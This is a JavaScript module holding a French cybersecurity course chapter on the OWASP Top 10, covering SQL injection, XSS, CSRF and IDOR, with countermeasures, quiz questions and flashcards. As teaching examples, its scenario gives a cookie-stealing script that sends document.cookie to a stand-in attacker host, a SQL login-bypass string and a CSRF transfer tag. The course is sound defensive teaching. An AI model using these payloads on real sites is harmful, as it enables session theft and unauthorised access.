/**
 * Chapitre 4 du cours « Cybersécurité » B2 — Vulnérabilités Applicatives & Top 10 OWASP.
 */
'use strict';

const { box } = require('../../../scripts/course-kit');

module.exports = {
  n: 4,
  title: 'Vulnérabilités Applicatives &amp; Top 10 OWASP',
  short: 'Vulnérabilités &amp; OWASP',
  toc: 'Référentiel OWASP Top 10, injections SQL (SQLi) et requêtes préparées, Cross-Site Scripting (XSS Stored/Reflected/DOM), CSRF et contrôle d’accès défaillant (IDOR).',
  time: '≈ 2 h 45 de travail',
  free: false,
  lockLabel: 'Réservé B2 et plus',

  situation:
    'Lors d’un test d’intrusion (pentest) sur une plateforme de commerce électronique, l’auditeur saisit ' +
    '<code>admin\' OR \'1\'=\'1</code> dans le formulaire de connexion et accède instantanément au tableau de bord administrateur sans mot de passe. ' +
    'Plus loin, il poste un commentaire contenant <code>&lt;script&gt;fetch("http://pirate.com/?c=" + document.cookie)&lt;/script&gt;</code> ' +
    'qui vole la session de tous les clients consultant la fiche produit. ' +
    'Pourquoi ces failles applicatives continuent-elles de figurer en tête du classement OWASP depuis vingt ans ? ' +
    'Comment réduire les risques d’injection et de XSS avec des défenses adaptées au contexte ? ' +
    'Ce module détaille l’anatomie des vulnérabilités web et leurs parades logicielles.',

  objectives: [
    'maîtriser le classement mondial du Top 10 de l’OWASP et ses catégories maîtresses (A01 à A03) ;',
    'analyser le mécanisme d’une injection SQL et déployer des requêtes préparées avec liaison de paramètres (Prepared Statements) ;',
    'différencier les trois variantes de Cross-Site Scripting (XSS stockée, réfléchie et basée sur le DOM) ;',
    'mettre en œuvre l’assainissement (sanitization), l’échappement contextuel et les drapeaux de cookies sécurisés (HttpOnly, SameSite) ;',
    'détecter et corriger les failles de contrôle d’accès au niveau de l’objet (IDOR / Broken Access Control).'
  ],

  sections: [
    {
      title: 'Le Top 10 de l’OWASP : La référence mondiale de la sécurité logicielle',
      html: [
        '<p>L’<strong>OWASP</strong> (Open Web Application Security Project) publie périodiquement le consensus mondial ' +
        'des dix risques les plus critiques pour les applications web. L’édition actuelle met en lumière les priorités suivantes :</p>',

        '<table class="table">',
        '  <thead><tr><th>Rang OWASP</th><th>Intitulé officiel</th><th>Description &amp; Impact métier</th></tr></thead>',
        '  <tbody>',
        '    <tr><td><strong>A01:2021</strong></td><td>Contrôle d’accès défaillant (Broken Access Control)</td><td>Un utilisateur régulier accède aux données d’autrui (failles IDOR, élévation de privilèges horizontale/verticale).</td></tr>',
        '    <tr><td><strong>A02:2021</strong></td><td>Défaillances cryptographiques (Cryptographic Failures)</td><td>Transmission en HTTP clair, stockage de mots de passe non salés, usage d’algorithmes obsolètes (MD5, DES).</td></tr>',
        '    <tr><td><strong>A03:2021</strong></td><td>Injection (Injections SQL, NoSQL, OS Command)</td><td>Des données fournies par l’utilisateur sont interprétées comme du code par l’interpréteur ou le moteur SQL.</td></tr>',
        '    <tr><td><strong>A04:2021</strong></td><td>Conception non sécurisée (Insecure Design)</td><td>Absence de modélisation des menaces et d’architecture de sécurité dès la phase de spécification.</td></tr>',
        '    <tr><td><strong>A05:2021</strong></td><td>Mauvaise configuration de sécurité (Security Misconfiguration)</td><td>Mots de passe par défaut conservés, messages d’erreur bavards révélant les stack traces, ports inutiles ouverts.</td></tr>',
        '  </tbody>',
        '</table>'
      ].join('\n')
    },
    {
      title: 'Injections SQL (SQLi) : Mécanisme &amp; Requêtes préparées',
      html: [
        '<p>L’injection SQL se produit lorsque des entrées utilisateur sont concaténées dynamiquement dans une chaîne SQL ' +
        'sans aucune neutralisation préalable :</p>',

        '<pre><code>// CODE TRÈS VULNÉRABLE (Concaténation directe) :\n' +
        'query = "SELECT * FROM users WHERE username = \'" + user_input + "\' AND password = \'" + pass_input + "\'";\n\n' +
        '// Si user_input vaut : admin\' OR \'1\'=\'1\n' +
        '// La requête exécutée par la base devient :\n' +
        'SELECT * FROM users WHERE username = \'admin\' OR \'1\'=\'1\' AND password = \'...\';\n' +
        '// La condition \'1\'=\'1 étant toujours vraie, la base renvoie le compte admin !</code></pre>',

        box('pitfall', 'La seule contre-mesure absolue : Les requêtes préparées (Prepared Statements)', [
          '<p>Le filtrage manuel par liste noire (retirer les guillemets ou le mot UNION) est régulièrement contourné par les pirates. ' +
          'La parade absolue consiste à utiliser des <strong>requêtes préparées avec paramètres typés</strong> :</p>' +
          '<pre><code># CODE ROBUSTE ET SÉCURISÉ (Paramètres séparés de l’analyse syntaxique) :\n' +
          'cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (user_input, pass_input))</code></pre>' +
          '<p>Le moteur SQL compile d’abord l’arbre syntaxique de la requête, puis injecte les paramètres comme de simples littéraux texte. ' +
          'Même si le paramètre contient <code>\' OR 1=1 --</code>, il sera recherché textuellement sans altérer la grammaire SQL.</p>'
        ].join('\n'))
      ].join('\n')
    },
    {
      title: 'Cross-Site Scripting (XSS) : Typologie &amp; Défense en profondeur',
      html: [
        '<p>Le XSS consiste à injecter des scripts JavaScript malveillants dans les pages web légitimes consultées par d’autres utilisateurs :</p>',

        '<div class="grid grid-3">',
        '  <div class="card">',
        '    <h4 class="card-title">1. XSS Stockée (Stored XSS)</h4>',
        '    <p>Le script malveillant est enregistré en base de données (ex. forum, commentaire) et exécuté chez chaque visiteur.</p>',
        '    <p><strong>Gravité :</strong> Maximale.</p>',
        '  </div>',
        '  <div class="card">',
        '    <h4 class="card-title">2. XSS Réfléchie (Reflected XSS)</h4>',
        '    <p>La charge utile est transmise dans un paramètre d’URL et réinjectée immédiatement dans la réponse (ex. résultat de recherche).</p>',
        '    <p><strong>Vecteur :</strong> Liens piégés par phishing.</p>',
        '  </div>',
        '  <div class="card">',
        '    <h4 class="card-title">3. XSS basée sur le DOM (DOM XSS)</h4>',
        '    <p>La faille réside entièrement côté client : du JavaScript local lit une source non sécurisée (<code>location.hash</code>) et l’écrit dans un puits dangereux (<code>element.innerHTML</code>).</p>',
        '  </div>',
        '</div>',

        box('info', 'Défense en profondeur contre le XSS', [
          '<ol>',
          '  <li><strong>Encodage adapté au contexte :</strong> Dans du texte HTML, encoder les caractères spéciaux ; dans un attribut HTML correctement cité, utiliser l’encodeur approprié. Pour une URL, valider le schéma et la destination autorisés, encoder les composants, puis l’attribut si nécessaire. Cet encodage HTML ne rend pas sûre une insertion dans du JavaScript, un gestionnaire d’événement ou une URL <code>javascript:</code>.</li>',
          '  <li><strong>Récepteurs et HTML autorisé :</strong> Préférer <code>textContent</code> pour du texte dans un élément non exécutable. Si du HTML fourni par l’utilisateur est indispensable, employer un assainissement avec une bibliothèque maintenue et une politique adaptée ; l’encodage de texte et l’assainissement de HTML sont différents.</li>',
          '  <li><strong>Drapeaux de cookies sécurisés :</strong> <code>HttpOnly</code> empêche la lecture du cookie par <code>document.cookie</code> et <code>Secure</code> limite son envoi à HTTPS ; ils n’empêchent pas un script injecté d’agir avec la session.</li>',
          '  <li><strong>Politique de sécurité de contenu (CSP) :</strong> Une CSP restrictive réduit les possibilités d’exécution de scripts ; son efficacité dépend de ses directives et elle ne remplace pas les autres protections.</li>',
          '</ol>'
        ].join('\n'))
      ].join('\n')
    },
    {
      title: 'CSRF (Cross-Site Request Forgery) &amp; Failles IDOR',
      html: [
        '<p>Deux autres failles majeures du contrôle applicatif méritent une attention rigoureuse :</p>',

        '<div class="grid grid-2">',
        '  <div class="card">',
        '    <h4 class="card-title">Attaque CSRF (Recherche de faux ordres)</h4>',
        '    <p>Un site piégé pousse le navigateur de la victime authentifiée à soumettre une requête à son insu vers la banque ' +
        '    (le navigateur joignant automatiquement les cookies de session) :</p>',
        '    <p><code>&lt;img src="https://banque.fr/virement?montant=1000&amp;dest=pirate" /&gt;</code></p>',
        '    <p><strong>Contre-mesures :</strong> Jeton synchronisé anti-CSRF (token aléatoire non prédictible) et attribut de cookie <code>SameSite=Lax</code> ou <code>Strict</code>.</p>',
        '  </div>',
        '  <div class="card">',
        '    <h4 class="card-title">Faille IDOR (Broken Object Access)</h4>',
        '    <p>L’application utilise un identifiant direct sans vérifier les droits du porteur de la session :</p>',
        '    <p><code>GET /api/facture?id=1042</code></p>',
        '    <p>Un utilisateur remplace 1042 par 1043 et consulte les données d’une autre société.</p>',
        '    <p><strong>Contre-mesure :</strong> Contrôle d’habilitation métier strict au niveau de la requête SQL ou du service de domaine.</p>',
        '  </div>',
        '</div>'
      ].join('\n')
    }
  ],

  questions: [
    {
      stem: 'Pourquoi l’utilisation de requêtes préparées (Prepared Statements) élimine-t-elle définitivement le risque d’injection SQL ?',
      opts: [
        'Parce que le moteur SQL sépare rigoureusement la phase de compilation syntaxique de la transmission des données, traitant les paramètres comme de simples valeurs scalaires',
        'Parce que les requêtes préparées chiffrent automatiquement la base de données en AES-256',
        'Parce qu’elles refusent automatiquement toute saisie contenant le caractère espace',
        'Parce qu’elles transfèrent l’exécution de la requête sur le navigateur du client'
      ],
      correct: 0,
      exp: 'En séparant la grammaire SQL des données littérales, le moteur de base de données ne réévalue jamais le contenu des paramètres comme une instruction exécutable, ce qui rend l’injection impossible.'
    },
    {
      stem: 'Quel attribut de cookie HTTP empêche formellement un script malveillant injecté par XSS de dérober le cookie de session via document.cookie ?',
      opts: [
        'HttpOnly',
        'Secure',
        'SameSite',
        'Domain'
      ],
      correct: 0,
      exp: 'L’attribut HttpOnly indique au navigateur que le cookie ne doit jamais être accessible via les APIs JavaScript du DOM (document.cookie), neutralisant ainsi le vol de session direct par XSS.'
    },
    {
      stem: 'Quelle variante d’attaque XSS consiste à enregistrer définitivement la charge utile malveillante dans la base de données du site visé ?',
      opts: [
        'XSS Stockée (Stored XSS)',
        'XSS Réfléchie (Reflected XSS)',
        'XSS basée sur le DOM (DOM XSS)',
        'XSS Aveugle (Blind XSS)'
      ],
      correct: 0,
      exp: 'La XSS stockée (ou persistante) sauvegarde le script dans la base de données (ex. profil, commentaire) qui s’exécute ensuite automatiquement chez tous les utilisateurs qui consultent cette ressource.'
    },
    {
      stem: 'Comment caractérise-t-on une vulnérabilité IDOR (Insecure Direct Object Reference) ?',
      opts: [
        'Le serveur autorise l’accès à un objet privé simplement en modifiant son identifiant dans la requête, sans vérifier que l’utilisateur connecté en est le propriétaire',
        'Le serveur utilise un algorithme de hachage cassé comme MD5',
        'Le port SSH 22 est exposé sur Internet sans mot de passe',
        'L’application ne dispose pas de certificat SSL/TLS valide'
      ],
      correct: 0,
      exp: 'L’IDOR survient lorsque l’application expose une référence directe à un objet interne (clé primaire en base) et omet de valider si l’identité authentifiée a le droit légitime de lire ou modifier cet objet.'
    }
  ],

  pitfalls: [
    'Tenter de contrer les injections SQL en concevant des filtres de nettoyage artisanaux basés sur des listes noires de mots clés.',
    'Négliger l’échappement des données en sortie sous prétexte qu’elles proviennent de la propre base de données interne du site.',
    'Oublier l’attribut HttpOnly sur les cookies contenant des jetons de session JWT ou d’authentification.',
    'Croire que la méthode HTTP POST protège naturellement contre les attaques CSRF (un formulaire invisible auto-soumis contourne POST facilement).',
    'Faire confiance à un identifiant transmis par le client dans un corps JSON sans vérifier l’appartenance de la ressource dans la session serveur.'
  ],

  methodTitle: 'Protocole en 4 étapes pour sécuriser les formulaires et APIs contre le Top 10 OWASP',
  method: [
    'Systématiser les requêtes préparées avec liaisons de paramètres typés pour chaque accès à la base de données relationnelle ou NoSQL.',
    'Privilégier les récepteurs de texte sûrs ; adapter l’encodage aux contextes HTML et attribut, valider les URL et éviter l’insertion de données non fiables dans du code JavaScript ou CSS.',
    'Durcir les cookies de session : forcer systématiquement les drapeaux HttpOnly, Secure et SameSite=Lax (ou Strict).',
    'Intégrer un contrôle d’accès systématique par politique (ex. CanAccess(user, document_id)) avant toute opération de lecture ou d’écriture.'
  ],

  summary: [
    'Le Top 10 OWASP classe les failles applicatives majeures, dominé par Broken Access Control et les Injections.',
    'Les requêtes préparées neutralisent les injections SQL en dissociant la compilation de la requête des données entrantes.',
    'Les protections XSS associent récepteurs sûrs, encodage selon le contexte, assainissement si du HTML est autorisé et mesures complémentaires comme CSP et HttpOnly.',
    'Le CSRF usurpe l’action de l’utilisateur authentifié et se bloque avec des jetons anti-CSRF et SameSite.',
    'Les failles IDOR exigent un contrôle rigoureux de l’appartenance de l’objet demandé à l’utilisateur de la session courante.'
  ],

  checklist: [
    'Je sais identifier une concaténation SQL vulnérable et la réécrire avec des requêtes préparées.',
    'Je distingue les contextes texte HTML, attribut, URL et JavaScript, ainsi que l’encodage et l’assainissement de HTML.',
    'Je comprends le rôle des drapeaux HttpOnly, Secure et SameSite sur les cookies.',
    'Je sais expliquer le fonctionnement d’une attaque CSRF et le rôle du jeton de synchronisation.',
    'Je sais concevoir une vérification de droits pour interdire les accès non autorisés de type IDOR.'
  ],

  notions: [
    'Référentiel OWASP Top 10',
    'Injection SQL (SQLi In-band, Blind)',
    'Requêtes préparées (Prepared Statements)',
    'Cross-Site Scripting (XSS Stored, Reflected, DOM)',
    'Échappement d’entités HTML',
    'Attributs de cookies (HttpOnly, Secure, SameSite)',
    'Politique de sécurité de contenu (CSP)',
    'Cross-Site Request Forgery (CSRF)',
    'Jetons synchronisés anti-CSRF',
    'Insecure Direct Object Reference (IDOR)'
  ],

  mastery: [
    { cls: 'low', text: '&lt; 50 % — Revois le principe d’une injection SQL et la différence entre XSS et CSRF.' },
    { cls: 'mid', text: '50–69 % — Entraînez-vous sur la réécriture en requêtes préparées et l’échappement des entités XSS.' },
    { cls: 'good', text: '70–94 % — Solide : vous maîtrisez les vulnérabilités du Top 10 OWASP et leurs mécanismes de défense.' },
    { cls: 'top', text: '≥ 95 % — Excellent : passe à l’authentification avancée, aux JWT et au contrôle RBAC au module 5.' }
  ],

  flashcards: [
    { "q": 'Qu’est-ce que « Référentiel OWASP Top 10 » ?', "a": 'Liste de sensibilisation publiée par OWASP, qui recense dix catégories de risques majeurs pour les applications web.' },
    { "q": 'Qu’est-ce que « Cross-Site Scripting (XSS Stored, Reflected, DOM) » ?', "a": 'Une XSS exécute du code injecté dans le navigateur : la charge peut être stockée ou réfléchie ; une XSS DOM implique un traitement dangereux côté client.' },
    { "q": 'Qu’est-ce que « Échappement d’entités HTML » ?', "a": 'Encoder les caractères spéciaux pour que les données soient interprétées comme du texte plutôt que comme du HTML ; adapter l’encodage au contexte.' },
    { "q": 'Qu’est-ce que « Attributs de cookies (HttpOnly, Secure, SameSite) » ?', "a": 'HttpOnly empêche la lecture du cookie par JavaScript ; Secure limite son envoi à HTTPS ; SameSite limite certains envois intersites.' },
    { "q": 'Qu’est-ce que « Politique de sécurité de contenu (CSP) » ?', "a": 'En-tête qui indique au navigateur les sources de ressources et de scripts autorisées ; il réduit le risque XSS sans remplacer l’encodage.' },
    { "q": 'Qu’est-ce que « Cross-Site Request Forgery (CSRF) » ?', "a": 'Une attaque CSRF fait envoyer une action non voulue par le navigateur authentifié de la victime ; un jeton anti-CSRF vérifié et SameSite la limitent.' },
    { q: 'Quelle est la cause fondamentale d’une vulnérabilité par injection SQL ?', a: 'La concaténation directe de données utilisateur non typées dans la commande SQL interprétée par la base de données.' },
    { q: 'Quelle est la seule contre-mesure définitive contre les injections SQL ?', a: 'L’utilisation systématique de requêtes préparées avec paramètres liés (Prepared Statements).' },
    { q: 'Pourquoi les défenses XSS dépendent-elles des contextes de sortie ?', a: 'Le texte HTML, un attribut cité et une URL exigent des traitements adaptés : valider aussi le schéma de l’URL. Éviter l’insertion directe dans JavaScript ; préférer textContent pour du texte et un assainissement adapté si du HTML est autorisé.' },
    { q: 'Quel est l’impact de l’attribut de cookie HttpOnly ?', a: 'Il interdit tout accès au cookie via le code JavaScript (document.cookie), bloquant le vol de session direct par XSS.' },
    { q: 'Comment une application web se protège-t-elle contre les attaques CSRF ?', a: 'En exigeant un jeton anti-CSRF secret et imprévisible avec chaque requête modifiante, et en activant SameSite=Lax sur les cookies.' },
    { q: 'Qu’est-ce qu’une faille IDOR (Insecure Direct Object Reference) ?', a: 'Une faille où un utilisateur accède à un document tiers simplement en changeant un identifiant dans l’URL sans contrôle d’autorisation.' }
  ]
};
